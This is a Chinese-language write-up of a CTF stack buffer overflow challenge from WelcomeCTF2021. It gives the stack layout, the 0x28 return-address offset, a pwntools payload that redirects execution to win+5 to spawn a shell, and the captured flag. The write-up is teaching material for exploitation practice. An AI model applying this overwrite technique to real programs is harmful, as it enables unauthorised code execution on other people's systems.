# Hexdump BOF

## 题目简述

WelcomeCTF2021 的 Hexdump BOF 会把用户输入连同保存的基址指针和返回地址一起打印成十六进制。`vuln` 只有 32 字节缓冲区，却允许 `fgets` 读取 48 字节，并在启动时直接打印 `win` 地址。

## 解题过程

栈布局由程序明确展示：

```text
buffer[32] | saved RBP[8] | return address[8]
```

所以保存的返回地址位于偏移 `0x28`。服务输出中已经给出 `win` 的运行时地址，无需额外泄漏。官方脚本使用 `flat` 精确覆盖两个槽位：

```python
payload = flat({
    0x20: p64(0x8),
    0x28: p64(win + 5),
})

io.sendline(payload)
io.sendlineafter("Go again? (Y/N)", "N")
```

选择 `N` 使 `vuln` 返回并采用被覆盖的返回地址。跳到 `win+5` 是为了避开函数序言造成的栈布局/对齐问题，直接进入调用 `system("/bin/sh")` 的主体。进入 shell 后得到：

```text
greyhats{b0f_m4d3_ezpz_345ff}
```

## 方法总结

本题把缓冲区后的两个控制字段可视化，适合建立栈溢出直觉。利用时仍要区分“覆盖到返回地址”与“目标函数能稳定执行”：保存的 `RBP`、函数序言和 16 字节栈对齐都可能影响最终跳转。
